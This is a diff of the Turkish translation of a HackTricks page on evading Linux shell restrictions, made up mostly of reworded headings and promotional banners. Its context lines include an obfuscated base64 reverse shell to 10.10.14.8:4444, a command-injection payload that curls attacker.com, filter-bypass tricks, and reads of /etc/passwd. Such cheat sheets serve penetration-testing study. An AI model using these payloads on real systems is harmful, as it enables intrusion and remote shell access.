@@ -1,23 +1,24 @@
 # Linux Kısıtlamalarını Atlatma
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'ı desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
-* [**Resmi PEASS & HackTricks ürünlerine göz atın**](https://peass.creator-spring.com)
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
+* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
+Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
 Bugün Erişim Alın:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -30,7 +31,7 @@ Bugün Erişim Alın:
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Kısa Rev kabuk
+### Kısa Rev shell
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -38,7 +39,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Yolları Atlayın ve yasaklanan kelimeleri geçin
+### Yolları Geçme ve yasaklı kelimeler
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -131,7 +132,7 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Boruları Atla
+### Boruları atlayın
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -155,12 +156,6 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
 ### Ortam Değişkenlerinden Karakter Alma
-
-```bash
-$ echo ${!A*}
-```
-
-Bu komut, ortam değişkenlerinden karakterleri almak için kullanılır.
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -169,10 +164,10 @@ echo ${PATH:0:1} #/
 
 Örneğin **burpcollab** veya [**pingb**](http://pingb.in) kullanabilirsiniz.
 
-### Yerleşik Fonksiyonlar
+### Dahili Komutlar
 
-Dış fonksiyonları yürütemediğiniz durumlarda ve yalnızca **sınırlı bir yerleşik fonksiyon kümesine erişiminiz varsa RCE elde etmek için**, bunu yapmanın bazı kullanışlı hileleri vardır. Genellikle **tüm yerleşikleri kullanamayacaksınız**, bu yüzden hapishaneden kaçmak için tüm seçeneklerinizi bilmelisiniz. Fikir [**devploit**](https://twitter.com/devploit)'ten alınmıştır.\
-Öncelikle tüm [**shell yerleşiklerini**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)** kontrol edin.** Sonra size bazı **tavsiyelerimiz** var:
+Dış işlevleri yürütemez ve yalnızca bir **sınırlı dahili komut kümesine erişiminiz varsa RCE elde etmek için bazı kullanışlı hileler vardır**. Genellikle **tüm dahili komutları kullanamayacaksınız**, bu yüzden hapishaneden kaçmak için tüm seçeneklerinizi bilmelisiniz. Fikir [**devploit**](https://twitter.com/devploit)'ten alınmıştır.\
+Öncelikle tüm [**kabuk dahili komutlarını**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)** kontrol edin.** Sonra işte size bazı **tavsiyeler**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -235,8 +230,6 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
-
-Bashfuscator, Bash kısıtlamalarını atlamak için kullanılan bir araçtır. Bu araç, Bash kodunu anlaşılması zor hale getirerek güvenlik önlemlerini atlamayı amaçlar. Bashfuscator, Bash betiklerini çalıştırmak için gerekli olan işlevselliği korurken, kodun okunabilirliğini azaltır. Bu sayede, güvenlik duvarları veya diğer kısıtlamaları atlamak için kullanılabilir.
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
@@ -323,15 +316,15 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Salt-Okuma/Noexec/Distroless Atlatma
+## Salt-Okunur/Noexec/Distroless Atlatma
 
-Eğer **salt-okuma ve noexec korumaları** olan bir dosya sistemi içinde veya hatta bir distroless konteyner içindeyseniz, hala **keyfi ikili dosyaları, hatta bir kabuğu çalıştırmanın yolları** vardır:
+Eğer **salt-okunur ve noexec korumaları** olan bir dosya sistemi içinde veya hatta bir distroless konteynerdeyseniz, hala **keyfi ikili dosyaları, hatta bir kabuğu çalıştırmanın yolları** vardır:
 
 {% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
-## Chroot ve Diğer Hapishaneleri Atlatma
+## Chroot ve Diğer Hapisaneler Atlatma
 
 {% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
@@ -347,21 +340,22 @@ Eğer **salt-okuma ve noexec korumaları** olan bir dosya sistemi içinde veya h
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)'i kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
-Bugün Erişim Alın:
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
+Bugün Erişim Edinin:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan Kahraman'a kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'i desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerine göz atın**](https://peass.creator-spring.com)
-* [**The PEASS Family'yi keşfedin**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
-* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
+* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
+{% endhint %}
